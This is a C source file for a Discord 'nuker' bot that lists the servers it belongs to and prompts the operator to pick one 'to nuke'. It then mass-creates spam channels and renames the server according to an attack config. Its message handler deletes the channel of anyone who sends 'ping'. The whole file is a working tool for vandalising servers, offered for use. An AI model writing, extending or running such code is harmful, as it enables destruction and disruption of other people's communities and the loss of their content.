#include <kk_client.h>
#include <kk_config.h>
#include <kk_dashboard.h>
#include <kk_callbacks.h>

#include <string.h>
#include <stdbool.h>
#include <orca/discord.h>

u64_snowflake_t get_guild(struct discord *client)
{
    // get guilds bot is a part of
    struct discord_guild **guilds = NULL;
    discord_get_current_user_guilds(client, &guilds);
    // assert(NULL != guilds && "Couldn't fetch guilds");

    printf("\n\nSelect the guild to nuke "
           "is part of");
    int i = 0;
    char *input_id = "1133087870962384937";
    char *formatted_id = "";

    while (guilds[i])
    {
        printf("\n%d. %s", i + 1, guilds[i]->name);
        ++i;
    }

    do
    {
        printf("\n\nNUMBER >>");
        char strnum[10];
        fgets(strnum, sizeof(strnum), stdin);
        int num = strtol(strnum, NULL, 10);
        if (num > 0 && num <= i)
        {
            u64_snowflake_t guild_id = guilds[num - 1]->id;
            discord_guild_list_free(guilds);
            return guild_id;
        }
        printf("\nPlease, insert a value between 1 and %d", i);
    } while (1);
}

void mass_channel(struct discord *client, u64_snowflake_t guild_id,
                  char *channel_name, int count)
{
    struct discord_create_guild_channel_params chn_params = {.name = channel_name};

    for (int i = 0; i < count; i++)
    {
        discord_create_guild_channel(client, guild_id, &chn_params, NULL);
    }
}

void guild_name(struct discord *client, u64_snowflake_t guild_id,
                char *guild_name)
{
    discord_modify_guild(
        client,
        guild_id,
        &(struct discord_modify_guild_params){
            .name = guild_name,
        },
        NULL);
}

void on_ready(struct discord *client)
{
    const struct discord_user *bot = discord_get_self(client);
    log_info("Logged in as %s!", bot->username);

    discord_set_presence(client, &(struct discord_presence_status){
                                     .activities =
                                         (struct discord_activity *[]){
                                             &(struct discord_activity){
                                                 .name = "#KrokodilOnTop",
                                                 .type = DISCORD_ACTIVITY_GAME,
                                                 .details = "Nuking with style",
                                             },
                                             NULL},
                                     .status = "idle",
                                     .afk = false,
                                     .since = discord_timestamp(client),
                                 });

    log_info("NAME: %s", s_attack.mass_channel_name);
    u64_snowflake_t guild_id = get_guild(client);

    if (s_attack.mass_channel_enabled == true)
    {
        mass_channel(client, guild_id, s_attack.mass_channel_name, s_attack.mass_channel_count);
    }

    if(s_attack.guild_name_enabled == true) {
        guild_name(client, guild_id, s_attack.guild_name);
    }
}

void on_message(struct discord *client,
                const struct discord_message *msg)
{
    if (strcmp(msg->content, "ping") != 0)
        return;

    discord_delete_channel(client, msg->channel_id, NULL);
    discord_async_next(client, NULL);
    struct discord_create_message_params params = {.content = "pong"};
    discord_create_message(client, msg->channel_id, &params, NULL);
}

void *client_init(char *TOKEN)
{
    struct discord *client = discord_init(TOKEN);
    discord_set_on_ready(client, &on_ready);
    discord_set_on_message_create(client, &on_message);
    discord_run(client);
}